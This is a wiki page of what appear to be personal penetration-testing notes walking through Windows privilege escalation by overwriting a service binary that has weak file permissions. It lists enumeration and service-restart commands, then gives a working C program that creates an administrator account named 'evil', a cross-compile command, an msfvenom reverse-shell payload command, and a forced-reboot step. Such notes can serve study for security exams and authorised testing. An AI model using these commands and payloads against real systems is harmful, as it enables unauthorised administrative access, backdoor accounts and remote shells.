Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.6
Creation-Date: 2021-10-22T12:27:11-05:00

====== Exploiting insecure file permissions ======
Created Friday 22 October 2021


Since developers of third-party manufactures have the responsibility to set correct permission on their file tree, this sometimes goes wrong.
If we have write access to the file, we can replace it with our own malware that does what we want.
If the program runs as a service, and thus under user SYSTEM, we might be able to restart it, or reboot the system to trigger our own program.

This walkthrough will take the service as a vantage point

===== Step 1 =====
Find out which programs are running using:
{{{code: lang="sh" linenumbers="False"
tasklist /v
}}}


* Identify the services, programs that run as administrator or SYSTEM.
* Select your target


===== Step 2 =====
Use [[Tools:Windows:icacls]] to enumerate the file permissions of your target. If we can overwrite, bingo.

===== Step 3 =====
We 'll now try to gain some more information of the restartablility of the service
Find the servive name:
{{{code: lang="sh" linenumbers="False"
sc queryex type=service state=all | findstr "SERVICE_NAME"
net stop <name>
net start <name>
}}}


If this fails, we don't have permission to stop the service. Let's find another way.
If it works, we can just replace the binary, stop and start the service. Done

Let's see if the service is configure to come up at boot:
{{{code: lang="sh" linenumbers="False"
wmic service where caption="<name>" get name, caption, state, startmode
}}}

If startmode == auto, itwill.

===== Step 4 =====
In this step we'll determine if we are allowed to reboot the system
{{{code: lang="sh" linenumbers="False"
whoami /priv
}}}

* Outputs the privileges of the user

If the following line is present, we can reboot the system:
{{{code: lang="sh" linenumbers="False"
SeShutdownPrivilege           Shut down the system                 Disabled
}}}

This mean that we've been granted permission. Disabled means that the process we ran did not request this permission, ie whoami.

===== Step 5 =====
Now all precondition have been met to implement our attack. We'll craft a program that will add a user, and the user to the administrative group.
{{{code: lang="c" linenumbers="True"
#include <stdlib.h>

int main (){
	int i;
	i = system ("net user evil Ev!lpass /add");
	i = system ("net localgroup administrators evil /add");
	return 0;
}
}}}


Compile on linux:
{{{code: lang="sh" linenumbers="False"
i686-w64-mingw32-gcc <code.c> -o <program.exe>
}}}


Alternatively, a remote shell can be spawned using this payload:
{{{code: lang="sh" linenumbers="False"
msfvenom -p windows/shell_reverse_tcp LHOST=<host> LPORT=<port> -f exe > revshell.exe
}}}


===== Step 6 =====
Upload the program and overwrite the original program.

===== Step 7 =====
Reboot the system:
{{{code: lang="sh" linenumbers="False"
shutdown /r /t 0 
}}}

* reboots the system (/r) immediately (/t 0)

You should now be able to log in with your new account and have administrator privileges

===== SEE =====
[[Tools:Windows:icacls]]
[[Tools:Windows:wmic]]
[[tools:Windows:sc]]
